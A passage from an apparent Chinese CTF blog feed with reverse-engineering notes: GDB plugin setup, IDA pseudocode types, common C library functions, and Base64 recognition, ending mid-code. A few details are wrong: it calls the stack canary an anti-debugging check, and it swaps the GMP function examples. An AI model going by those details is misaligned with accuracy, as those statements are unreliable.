        <content type="html"><![CDATA[<h2 id="安装-GDB"><a href="#安装-GDB" class="headerlink" title="安装 GDB"></a>安装 GDB</h2><blockquote><p><code>sudo apt-get install gdb</code></p></blockquote><hr><h2 id="安装-gdb-peda"><a href="#安装-gdb-peda" class="headerlink" title="安装 gdb-peda"></a>安装 gdb-peda</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/longld/peda.git ~/peda<span class="token builtin class-name">echo</span> <span class="token string">"source ~/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="下载-Pwngdb"><a href="#下载-Pwngdb" class="headerlink" title="下载 Pwngdb"></a>下载 Pwngdb</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="下载安装-pwndbg"><a href="#下载安装-pwndbg" class="headerlink" title="下载安装 pwndbg"></a>下载安装 pwndbg</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/pwndbg/pwndbg <span class="token builtin class-name">cd</span> ~/pwndbg./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="配置-Pwngdb"><a href="#配置-Pwngdb" class="headerlink" title="配置 Pwngdb"></a>配置 Pwngdb</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/<span class="token function">vim</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>在第二行插入：<code>source ~/pwndbg/gdbinit.py</code></p></blockquote><ul><li>运行 gdb，查看是否出错，是否显示 gdb-peda$</li><li>若命令行在 gdb-peda$ 之前显示有错误，将 .gdbinit 第一行 <code>source ~/peda/peda.py</code> 注掉</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪代码中的数据和类型</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/IDA/%E4%BC%AA%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%92%8C%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/IDA/%E4%BC%AA%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%92%8C%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="数值表示"><a href="#数值表示" class="headerlink" title="数值表示"></a>数值表示</h2><h3 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h3><table><thead><tr><th>符号后缀</th><th>含义</th></tr></thead><tbody><tr><td><strong>u</strong></td><td>unsigned int</td></tr><tr><td><strong>L</strong></td><td>long</td></tr><tr><td><strong>F</strong></td><td>float</td></tr><tr><td><strong>LL</strong></td><td>long long</td></tr></tbody></table><ul><li><p><strong>0x18</strong>，十六进制数 18，十进制数 24</p></li><li><p><strong>0x47ui64</strong>，十六进制数 47，十进制数 71，类型为 <code>unsigned __int64</code></p></li><li><p><strong>\x1A</strong>，十六进制数 1A，十进制数 26，其中 <code>\x</code> 为转义字符</p><ul><li><code>\x</code> 表示后面的字符是 十六进制数</li><li><code>\0</code> 表示后面的字符是 八进制数</li></ul></li><li><p>在标准的 C++ 代码中没有类似于 <code>ui64</code> 的后缀，是编译器扩展，改为 <code>u</code> 即可</p></li></ul><hr><h3 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h3><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><strong>int8</strong></td><td align="left">8 位，等于 byte，占 1 个字节</td></tr><tr><td align="left"><strong>int16</strong></td><td align="left">16 位，等于 short，占 2 个字节</td></tr><tr><td align="left"><strong>int32</strong></td><td align="left">32 位，等于 int，占 4 个字节</td></tr><tr><td align="left"><strong>int64</strong></td><td align="left">64 位，等于long，占8个字节</td></tr></tbody></table><ul><li><p>伪代码中的 <code>_DWORD</code> 类型，在 C++ 中需引入头文件 <code>#include &lt;windows.h&gt;</code>，去掉 <code>&#39;_&#39;</code>，改写为 <code>DWORD</code></p></li><li><p>IDA 的伪代码中，有些参数的数据类型并不准确，比如 <code>char 类型</code>、<code>string 类型</code>、<code>_int64 类型</code> 等，需自己判断</p></li></ul><p><em><strong>(_BYTE *)</strong></em></p><ul><li>将值或寄存器转换为字节指针，类似于将值分配给 C 变量 <code>byte *</code></li></ul><p><em><strong>*(_BYTE *)</strong></em></p><ul><li>从地址中提供的指针中取出一个字节</li><li>示例：<br>如果地址是 12345678，并且该地址存放的是字符串 “hello”<br><code>x = *(_BYTE *) (12345678 + counter)</code><br>如果 counter 是 0，那么 x 将是 ‘h’<br>如果 counter 是 1，那么 x 将是 ‘e’</li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><em><strong>LOWORD()</strong></em></td><td align="left">得到一个 32bit 数的 低 16bit</td></tr><tr><td align="left"><em><strong>HIWORD()</strong></em></td><td align="left">得到一个 32bit 数的 高 16bit</td></tr><tr><td align="left"><em><strong>LOBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最低（最右边）那个字节 8bit</td></tr><tr><td align="left"><em><strong>HIBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最高（最左边）那个字节 8bit</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪代码中的函数</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/IDA/%E4%BC%AA%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/IDA/%E4%BC%AA%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="readfsqword"><a href="#readfsqword" class="headerlink" title="readfsqword"></a>readfsqword</h3><blockquote><p><strong><code>__readfsqword(0x28u)</code>——canary 保护机制，防止调试</strong></p></blockquote><ul><li>程序开始时，定义 v6 &#x3D; <code>__readfsqword(0x28u)</code>;</li><li>程序结束时，通过异或或者其他手段检测 v6 的值是否发生改变</li><li>若该值发生改变，则程序终止运行</li></ul><hr><h3 id="alarm"><a href="#alarm" class="headerlink" title="alarm"></a>alarm</h3><blockquote><p><strong><code>unsigned int alarm(unsigned int seconds)</code>——设置信号传送闹钟，干扰调试</strong></p></blockquote><ul><li>用来设置信号 sigalrm 在经过参数 seconds 秒数后发送给目前的进程<br>如果未设置信号 sigalrm 的处理函数，那么 alarm() 默认处理终止进程</li><li>如果在 seconds 秒内再次调用了 alarm 函数设置了新的闹钟，则后面定时器的设置将覆盖前面的设置，即之前设置的秒数被新的闹钟时间取代<br>当参数 seconds 为 0 时，之前设置的定时器闹钟将被取消，并将剩下的时间返回</li></ul><hr><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><blockquote><p><strong><code>ssize_t read(int fd, void *buf, size_t count)</code>——用于从文件描述符对应的文件中读取数据</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符, 从command line获取数据时，为 0</td></tr><tr><td>buf</td><td>读出数据的缓冲区</td></tr><tr><td>count</td><td>每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）</td></tr></tbody></table><ul><li>成功：返回读出的字节数<br>失败：返回-1，并设置 errno。如果在调用 read 之前到达文件末尾，则这次 read 返回 0</li><li><mark><strong>read 函数可以取代 scanf 从 command line 读取数据</strong></mark></li></ul><hr><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><blockquote><p><strong><code>ssize_t write(int fd,const void *buf,size_t count)</code>——用于将数据写入到文件描述符对应的文件</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>fd</td><td>文件描述符（输出到 command line，就是 1）</td></tr><tr><td>buf</td><td>通常是一个字符串，需要写入的字符串</td></tr><tr><td>count</td><td>每次写入的字节数</td></tr></tbody></table><ul><li>成功：返回写入的字节数<br>失败：返回 -1，并设置 errno</li><li><mark><strong>write 函数可以代替 printf，往 command line 打印输出</strong></mark></li></ul><hr><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><blockquote><p>  <strong><code>size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</code>——从给定流 stream 读取数据到 ptr 所指向的数组中</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>ptr</td><td>指向带有最小尺寸 size * nmemb 字节的内存块的指针</td></tr><tr><td>size</td><td>要读取的每个元素的大小，以字节为单位</td></tr><tr><td>nmemb</td><td>元素的个数，每个元素的大小为 size 字节</td></tr><tr><td>stream</td><td>指向 FILE 对象的指针，该 FILE 对象指定了一个输入流</td></tr></tbody></table><ul><li>成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型</li><li>如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾</li></ul><hr><h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><blockquote><p><strong><code>void *memset(void *str, int ch, size_t n)</code>——用于非常量的内存空间初始化</strong></p></blockquote><ul><li>复制字符 ch（一个无符号字符）到参数 str 所指向的字符串的前 n 个字符</li><li>将 str 中当前位置后面的 n个字节 用 ch 替换并返回 str，ch 只有最低的字节起作用</li><li>作用是将某一块内存中的内容全部设置为指定的值， 这个函数通常为新申请的内存做初始化工作</li></ul><hr><h3 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h3><blockquote><p><strong><code>int atoi(const char *str)</code>——把参数 str 所指向的字符串转换为一个整数（类型为 int 型）</strong></p></blockquote><ul><li>该函数返回转换后的长整数，如果没有执行有效的转换，则返回零</li><li>示例：<br><img src="https://s2.loli.net/2023/03/17/LNAta9drBpuFQfm.png" alt="CTF - Reverse_IDA——C伪代码知识1.png"></li><li>结果：<br><img src="https://s2.loli.net/2023/03/17/ak7pjPw3e1nAEhF.png" alt="CTF - Reverse_IDA——C伪代码知识2.png"></li></ul><hr><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><blockquote><p><strong><code>int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</code>——定义流 stream 应如何缓冲，把缓冲区与流相关</strong></p></blockquote><ul><li>如果成功，则该函数返回 0，否则返回非零值</li></ul><hr><h3 id="errno-location"><a href="#errno-location" class="headerlink" title="errno_location"></a>errno_location</h3><blockquote><p><strong><code>int *__errno_location(void)</code>——返回当前线程的变量地址</strong></p></blockquote><ul><li>这个函数的返回值是一个函数指针，这个指针指向线程自己的 errno 的位置，通过对这个指针解引用，就可以访问线程唯一的 errno</li><li><strong>errno 是 error number 的缩写，意味系统调用错误码</strong><br>如果系统调用返回成功，errno 有可能但不一定会置 0；而系统调用出错时，errno 必定会被设为对应的错误编号</li></ul><hr><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><blockquote><p><strong><code>void *malloc(size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><ul><li>size 为内存块的大小，以字节为单位</li><li>该函数返回一个指针 ，指向已分配大小的内存。如果请求失败，则返回 NULL</li></ul><hr><h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h3><blockquote><p><strong><code>void *calloc(size_t nitems, size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>nitems</td><td>要被分配的元素个数</td></tr><tr><td>size</td><td>元素的大小</td></tr></tbody></table><ul><li>该函数返回一个指针，指向已分配的内存。如果请求失败，则返回 NULL</li><li>malloc 和 calloc 之间的不同点：<br><mark>malloc 不会设置内存为零；而 calloc 会设置分配的内存为零</mark></li></ul><hr><h3 id="gmpz-init-set-str（等同于-mpz-init-set-str）【GMP】"><a href="#gmpz-init-set-str（等同于-mpz-init-set-str）【GMP】" class="headerlink" title="gmpz_init_set_str（等同于 mpz_init_set_str）【GMP】"></a>gmpz_init_set_str（等同于 mpz_init_set_str）【GMP】</h3><blockquote><p><strong><code>int mpz_init_set_str (mpz_t rop, char *str, int base)</code>——将 str 字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</strong></p><p><strong>GMP 又叫 GNU 多精度算术库，是一个提供了很多操作高精度的大整数、浮点数运算的算术库，几乎没有什么精度方面的限制，功能丰富</strong></p></blockquote><ul><li>这三个参数分别是：</li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>rop</td><td>多精度整数变量</td></tr><tr><td>str</td><td>字符串</td></tr><tr><td>base</td><td>进制</td></tr></tbody></table><ul><li>示例：<br><code>mpz_powm(op1,op2,op3,op4)； // 求幂模函数</code>，即：<code>op1 = op2 ^ op3 mod op4</code></li></ul><hr><h3 id="gmpz-powm（等同于-mpz-powm）【GMP】"><a href="#gmpz-powm（等同于-mpz-powm）【GMP】" class="headerlink" title="gmpz_powm（等同于 mpz_powm）【GMP】"></a>gmpz_powm（等同于 mpz_powm）【GMP】</h3><blockquote><p><strong><code>void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)</code>——计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中</strong></p></blockquote><ul><li>运算的过程和 RSA 的加密过程一样</li><li>示例：<br><code>mpz_init_set_str(b, “200000”, 10)； // 即：b=200000，十进制</code></li></ul><hr><h3 id="gmpz-cmp（等同于-mpz-cmp）【GMP】"><a href="#gmpz-cmp（等同于-mpz-cmp）【GMP】" class="headerlink" title="gmpz_cmp（等同于 mpz_cmp）【GMP】"></a>gmpz_cmp（等同于 mpz_cmp）【GMP】</h3><blockquote><p><strong><code>mpz_cmp(mpz_t num1, mpz_t num_2)</code>——比较两个数</strong></p></blockquote><ul><li>示例：<br><code>mpz_cmp(b, c)； // 若 b 大于 c，返回1；若 b 等于 c，返回0；若 b 小于 c，返回-1</code></li></ul><hr><h3 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h3><blockquote><p><strong><code>char *strcat(char *dest, const char *src)</code>——把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>dest</td><td>指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</td></tr><tr><td>src</td><td>指向要追加的字符串，该字符串不会覆盖目标字符串</td></tr></tbody></table><ul><li>该函数返回一个指向最终的目标字符串 dest 的指针</li></ul><hr><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><blockquote><p><strong><code>time_t time(time_t *timer)</code>——得到当前日历时间或者设置日历时间</strong></p></blockquote><ul><li>参数说明:<br>timer &#x3D; NULL 时得到当前日历时间（从1970-01-01 00:00:00到现在的秒数）<br>timer &#x3D; 时间数值 时，用于设置日历时间，time_t 是一个 unsigned long 类型<br>如果 timer 不为空，则返回值也存储在变量 timer 中</li><li>函数返回：当前日历时间</li></ul><hr><h3 id="localtime"><a href="#localtime" class="headerlink" title="localtime"></a>localtime</h3><blockquote><p><strong><code>struct tm *localtime(const time_t *timer)</code>——使用 timer 的值来填充 tm 结构。timer 的值被分解为 tm 结构，并用本地时区表示</strong></p></blockquote><ul><li>timer 是指向表示日历时间的 time_t 值的指针</li><li>该函数返回指向 tm 结构的指针，该结构带有被填充的时间信息</li><li>tm 结构的细节：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">tm</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> tm_sec<span class="token punctuation">;</span>         <span class="token comment">/* 秒，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_min<span class="token punctuation">;</span>         <span class="token comment">/* 分，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_hour<span class="token punctuation">;</span>        <span class="token comment">/* 小时，范围从 0 到 23 */</span>   <span class="token keyword">int</span> tm_mday<span class="token punctuation">;</span>        <span class="token comment">/* 一月中的第几天，范围从 1 到 31 */</span>   <span class="token keyword">int</span> tm_mon<span class="token punctuation">;</span>         <span class="token comment">/* 月份，范围从 0 到 11 */</span>   <span class="token keyword">int</span> tm_year<span class="token punctuation">;</span>        <span class="token comment">/* 自 1900 起的年数 */</span>   <span class="token keyword">int</span> tm_wday<span class="token punctuation">;</span>        <span class="token comment">/* 一周中的第几天，范围从 0 到 6 */</span>   <span class="token keyword">int</span> tm_yday<span class="token punctuation">;</span>        <span class="token comment">/* 一年中的第几天，范围从 0 到 365 */</span>   <span class="token keyword">int</span> tm_isdst<span class="token punctuation">;</span>       <span class="token comment">/* 夏令时 */</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h3><blockquote><p><strong><code>int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)</code>——用来创建线程，在线程创建以后，就开始运行相关的线程函数</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>pthread_t *thread</code></td><td align="left">新创建的线程 ID 指向的内存单元。pthread_t 是一种用于表示线程的数据类型，每一个 pthread_t 类型的变量都可以表示一个线程</td></tr><tr><td align="left"><code>const pthread_attr_t *attr</code></td><td align="left">用于手动设置新建线程的属性，例如线程的调用策略、线程所能使用的栈内存的大小等。大部分场景中，我们都不需要手动修改线程的属性，将 attr 参数赋值为 NULL，pthread_create() 函数会采用系统默认的属性值创建线程</td></tr><tr><td align="left"><code>void *(*start_routine) (void *)</code></td><td align="left">新创建的线程从start_rtn函数的地址开始运行。形参和返回值的类型都必须为 void* 类型</td></tr><tr><td align="left"><code>void *arg</code></td><td align="left">指定传递给 start_routine 函数的实参，当不需要传递任何数据时，将 arg 赋值为 NULL 即可</td></tr></tbody></table><ul><li>如果成功创建线程，pthread_create() 函数返回数字 0，反之返回非零值</li><li>各个非零值都对应着不同的宏，指明创建失败的原因，常见的宏有以下几种：<ol><li><strong>EAGAIN</strong>：系统资源不足，无法提供创建线程所需的资源</li><li><strong>EINVAL</strong>：传递给 pthread_create() 函数的 attr 参数无效</li><li><strong>EPERM</strong>：传递给 pthread_create() 函数的 attr 参数中，某些属性的设置为非法操作，程序没有相关的设置权限</li></ol></li></ul><hr><h3 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a>pthread_join</h3><blockquote><p><strong><code>int pthread_join(pthread_t thread, void ** retval)</code>——获取某个线程执行结束时返回的数据</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">thread</td><td align="left">指定接收哪个线程的返回值</td></tr><tr><td align="left">retval</td><td align="left">接收到的返回值。如果 thread 线程没有返回值，或者不需要接收 thread 线程的返回值，可以将 retval 参数置为 NULL</td></tr></tbody></table><ul><li><code>pthread_join()</code> 函数会一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除</li><li>如果 <code>pthread_join()</code> 函数成功等到了目标线程执行结束（成功获取到目标线程的返回值），返回值为数字 0；反之如果执行失败，函数会根据失败原因返回相应的非零值，每个非零值都对应着不同的宏，例如：  <ol><li><strong>EDEADLK</strong>：检测到线程发生了死锁</li><li><strong>EINVAL</strong>：分为两种情况，要么目标线程本身不允许其它线程获取它的返回值，要么事先就已经有线程调用 pthread_join() 函数获取到了目标线程的返回值</li><li><strong>ESRCH</strong>：找不到指定的 thread 线程</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> IDA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密算法的函数特征</title>
      <link href="/2023/03/17/CTF%20-%20Reverse/IDA/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%81/"/>
      <url>/2023/03/17/CTF%20-%20Reverse/IDA/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><blockquote><p>转换步骤：<br>第1步，将待转换的字符串，每 3个字节分为一组，每个字节占 8bit，共 24个二进制位<br>第2步，将上面的 24个二进制位，每 6个字节做为一组，共分为 4组（<em>若最后一组字符数不足三个，用 ‘&#x3D;’ 补充</em>）<br>第3步，在每组前面添加两个 0，每组由 6个变为 8个二进制位，总共 32个二进制位，即 4个字节<br>第4步，根据 Base64 编码对照表获得对应的值</p><p><strong>Base64 &amp; Base32 &amp; Base16</strong><br><em><strong>Base64</strong></em> 就是用每 6位二进制（2的6次幂就是64）来表示一个字符，因此称为 Base64<br>同理：<em><strong>Base32</strong></em> 就是用 5位二进制（2的5次幂就是32），<em><strong>Base16</strong></em> 就是用 4位二进制（2的4次幂就是16）</p><p><strong>原始 Base64 码表</strong>：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><p><strong>Base64 为什么使用 3个字节作为一组呢？</strong><br>因为 6 和 8 的最小公倍数为 24，三个字节正好 24个二进制位，每 6bit 为一组，恰好能够分为 4组</p><p><strong>base64算法解码过程</strong><br>去掉所有的等号，查表将字符转为二进制的索引值，最后每 8位一组计算 ASCii 码还原字符，<mark>不足 8位则丢弃</mark></p></blockquote><hr><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>Base64 要用到 Base64码表，可以在程序中找到连续的字符串：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</li><li>根据 Base64 加密原理，代码中必然存在<mark>根据余数个数判断是否添加等号</mark>的代码<br>字符 ‘&#x3D;’ 的 ASCii 码：61（0x3D），也有可能直接索引码表里面的 ‘&#x3D;’</li><li>识别代码中对数据的左移右移操作<br><code>((a[0] &amp; 3) &lt;&lt; 4) | (a[1] &gt;&gt; 4 )</code> 和 <code>(16 * (a[0] &amp; 3)) | (a[1] / 16)</code> 是等价操作，都表示取 <code>a[0]</code> 后 2位与 <code>a[1]</code> 前 4位拼接，是 Base64 中的常见操作</li><li>最主要的是理解编码解码原理，比如编码时通常都会用 3个字节一组来处理比特位数据</li></ol><hr><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>以下图的表格为示例，具体分析一下整个过程：<br><img src="https://s2.loli.net/2023/03/17/KR5dFYpn3VcDOBs.jpg" alt="加密算法的函数特征1.jpeg"></p><ol><li>第1步，根据 ‘M’、’a’、’n’ 对应的 ASCii 码值分别为 77，97，110，对应的二进制值是：01001101、01100001、01101110，由此组成一个 24位的二进制字符串</li><li>第2步，如图红色框，将 24位每 6位二进制位一组分成 4组</li><li>第3步，在上面每一组前面补两个 0，扩展成 32个二进制位：<mark>00</mark>010011、<mark>00</mark>010110、<mark>00</mark>000101、<mark>00</mark>101110</li><li>第4步，四组 8bit 分别对应的值（ <strong>Base64 编码索引</strong>）为：19、22、5、46，在 Base64 编码表中进行查找，分别对应：’T’、’W’、’F’、’u’，因此 “Man” 经过 Base64 编码之后就变为：”TWFu”</li></ol><p><strong>位数不足的情况</strong><br>位数不足用 ‘&#x3D;’ 补充，总共有两种情况：</p><ol><li>最后一组只有一个字符</li><li>最后一组有两个字符<br><img src="https://s2.loli.net/2023/03/17/LcGV3tyPHXz7rpO.png" alt="加密算法的函数特征2.png"></li></ol><hr><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// eax  </span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-54h]  </span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-50h]  </span>    <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-4Ch]  </span>    <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-48h]  </span>    <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-44h]  </span>    <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-40h]  </span>    <span class="token keyword">unsigned</span> __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]  </span>        v16 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// a1为输入的字符串  </span>    v14 <span class="token operator">=</span> v1 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v14为输入字符串长度除3以后的余数  </span>    v13 <span class="token operator">=</span> v1 <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span>   <span class="token comment">// v13为3个一组的字符组合数量  </span>    <span class="token function">memset</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;</span> v13 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v2 <span class="token operator">=</span> v10<span class="token punctuation">;</span>        v11 <span class="token operator">=</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 第一个：a1[0]右移2位，取前6位作为索引值，查找对应字符</span>        src<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            v3 <span class="token operator">=</span> v11<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment">// 第二个：a1[0]取后2位与a1[1]的前4位拼接    </span>        src<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 第三个：a1[1]取后4位与a1[2]的前2位拼接，查找对应字符    </span>        src<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9 <span class="token operator">+</span> <span class="token 